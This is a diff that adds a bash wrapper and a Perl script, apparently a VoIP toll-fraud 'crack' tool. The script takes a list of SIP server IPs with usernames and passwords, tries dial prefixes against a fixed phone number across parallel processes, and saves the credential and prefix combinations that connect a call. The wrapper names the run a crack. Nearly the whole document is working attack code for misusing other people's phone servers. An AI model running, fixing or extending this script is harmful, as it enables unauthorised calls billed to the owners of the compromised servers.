@@ -1,0 +1,132 @@
+#!/bin/bash
+
+# Testing SIP prefix
+echo -e "\nStart Testing ...\n"
+
+perl call line.txt 1000 40 >> test.txt
+
+grep "success" test.txt > CALL.txt
+sort -u CALL.txt > successCALL.txt
+rm test.txt
+rm CALL.txt
+
+echo -e "\nEnding crack !\n"
+echo -e "\nby Mohammad Elnwajha\n"
+=====================================================
+
+يحتاج بعض التعديلات
+
+use Data::Dumper;
+use IO::Socket::INET;
+use Socket;
+use Test::More;
+use Net::SIP;
+use Parallel::ForkManager;
+use Term::ANSIColor;
+use Time::HiRes qw(gettimeofday tv_interval);
+use vars qw($t);
+no warnings 'uninitialized';
+my $ips = $ARGV[0];
+my $num = '184885651';
+#my $num = '201126291919';
+#my $num = '201126291919';
+my $file = 'prx';
+my $filename = 'caller.log';
+my $ring_time = '40';
+my $max_processes = $ARGV[1];
+my $t = $ARGV[2];
+my $pm = Parallel::ForkManager->new($max_processes);
+#######
+if (@ARGV<1){
+print "[!] $0 <ip_file> <threads> <timeout>\r\n";
+exit;
+}
+
+open my $handle1, '<', $ips;
+chomp(my @IPS = <$handle1>);
+close $handle1;
+open my $handle1, '<', $file;
+chomp(my @PRX = <$handle1>);
+close $handle1;
+######
+foreach $prf (@PRX){
+foreach $line (@IPS){
+my $to = "$prf$num";
+my $pid = $pm->start and next;
+my ($ip,$user,$pass) = split(/ /, $line);
+$ip =~ s/\x0a//g;
+print color("bold red"),"$ip $user $pass $to\n";
+call($ip,$user,$pass,$to);
+$pm->finish;
+}
+print color("bold red"),"Switching $prf$num \n";
+}
+$pm->wait_all_children();
+
+sub call{
+#my $pid = fork();
+my $ip = shift;
+my $user = shift;
+my $pass = shift;
+my $to = shift;
+my ($t1,$t2);
+alarm($t);
+#local $SIG{__DIE__} = sub { kill 9,$pid; ok( 0,'died' ) };
+#local $SIG{ALRM} = sub { kill 9,$pid };
+if(!$ip){
+exit;
+}
+my $ua = Net::SIP::Simple->new(
+outgoing_proxy => $ip,
+registrar => $ip,
+domain => $ip,
+from => $user,
+auth => [ $user,$pass ]
+);
+#print Dumper($ua);
+    my $peer_hangup; # did peer hang up?
+    my $no_answer;
+    my $rtp_done;
+    my $ringing = 0;
+    print "$test_n $user $pass $ip $to\n";
+    my $call = $ua->invite("$to",
+    init_media => sub {
+my $now = time;
+my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+#print "Assuming Call is Made $ip $user $pass $to $hour:$min:$sec\n";
+print "success $ip $user $pass $to $hour:$min:$sec\n";
+},
+    cb_rtp_done => \$rtp_done,
+    asymetric_rtp => 0,
+    rtp_param => [ 8, 160, 160/8000, 'PCMA/8000' ],
+	cb_established => sub { diag( "call established $ip $user $pass $to" ) },
+    recv_bye => \$peer_hangup,
+    cb_noanswer => \$no_answer,
+    ring_time => $ring_time,
+);
+
+#}
+
+#$ua->loop( \$rtp_done,\$peer_hangup,\$no_answer );
+my $t1 = [gettimeofday];
+my $done;
+$call->reinvite( recv_bye => \$done);
+$ua->loop(\$done);
+if($done){
+my $t2 = [gettimeofday];
+my $t0_t1 = tv_interval $t1, $t2;
+if($t0_t1 > 2.9 && $t0_t1 < 3.5){
+my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+print color("bold Green"),"Call Made 
+$ip $user $pass $to 
+$hour:$min:$sec 
+$t0_t1
+\n";
+
+print color("bold Green")," success calling and saving Rezult! \n";
+open(OUTPUT,">>success.txt");
+print OUTPUT "$ip $user $pass $to $hour:$min:$sec $t0_t1\n";
+close (OUTPUT);
+}
+}
+}
